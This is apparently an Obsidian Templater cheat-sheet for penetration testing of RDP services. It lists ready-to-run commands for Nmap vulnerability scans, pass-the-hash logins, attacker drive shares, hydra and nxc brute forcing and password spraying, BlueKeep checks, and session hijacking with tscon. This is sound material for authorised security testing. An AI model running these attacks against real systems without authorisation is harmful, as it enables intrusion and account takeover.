# RDP — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let domain = tp.frontmatter.domain; let user = tp.frontmatter.username || '<user>'; let pass = tp.frontmatter.password || '<pass>'; let port = tp.frontmatter.current_port || 3389 -%>

---

## Nmap
```bash
nmap -p<% port %> --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info <% ip %>
```

---

## Connect

### xfreerdp (recommended)
```bash
xfreerdp /v:<% ip %>:<% port %> /u:<% user %> /p:'<% pass %>' /cert:ignore +clipboard /dynamic-resolution
```

```bash
# With domain
xfreerdp /v:<% ip %>:<% port %> /u:<% user %> /p:'<% pass %>' /d:<% domain %> /cert:ignore +clipboard /dynamic-resolution
```

```bash
# Pass the Hash (RDP with NLA disabled or with Restricted Admin)
xfreerdp /v:<% ip %>:<% port %> /u:<% user %> /pth:<% tp.frontmatter.ntlm_hash || 'NTLM_HASH' %> /d:<% domain %> /cert:ignore +clipboard
```

```bash
# Drive share (access attacker files on target)
xfreerdp /v:<% ip %>:<% port %> /u:<% user %> /p:'<% pass %>' /cert:ignore /drive:share,/tmp +clipboard
```

### rdesktop
```bash
rdesktop -u <% user %> -p '<% pass %>' <% ip %>:<% port %> -g 95%
```

```bash
rdesktop -u <% user %> -p '<% pass %>' <% ip %>:<% port %> -g 95% -d <% domain %>
```

### Remmina
```bash
remmina -c rdp://<% user %>:'<% pass %>'@<% ip %>:<% port %>
```

---

## NLA Check
```bash
nmap -p<% port %> --script=rdp-enum-encryption <% ip %>
```

> [!info] If output shows `NLA: SUPPORTED`, Network Level Authentication is enabled — you need valid credentials before seeing the login screen. Pass-the-Hash only works if Restricted Admin Mode is enabled on the target.

```bash
# Check if Restricted Admin is enabled (allows PtH to RDP)
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
# 0 = Restricted Admin enabled (PtH works)
```

---

## Screenshot (without credentials)
```bash
nxc rdp <% ip %> --screenshot --screentime 5
```

---

## Brute Force
```bash
hydra -l <% user %> -P /usr/share/wordlists/rockyou.txt rdp://<% ip %> -s <% port %> -t 1 -V
```

```bash
nxc rdp <% ip %> -u users.txt -p passwords.txt
```

```bash
nxc rdp <% ip %> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

> [!warning] RDP brute force is very slow and noisy — lockout risk is high. Password spray is safer.

---

## Vulnerability Checks

### BlueKeep (CVE-2019-0708 — pre-auth RCE)
```bash
nmap -p<% port %> --script=rdp-vuln-ms12-020 <% ip %>
```

```bash
# Metasploit check (safe, no exploitation)
# use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
# set RHOSTS <% ip %>
# run
```

### DejaBlue (CVE-2019-1181/1182)
> Affects Windows 10 and Server 2019 — similar to BlueKeep. Check patch level.

### MS12-020 (DOS)
```bash
nmap -p<% port %> --script=rdp-vuln-ms12-020 <% ip %>
```

---

## Session Hijacking (requires admin on target)
```bash
# List active sessions
query user /server:<% ip %>

# Hijack session (run as SYSTEM)
tscon <session_id> /dest:<your_session>
```

---

## Notes
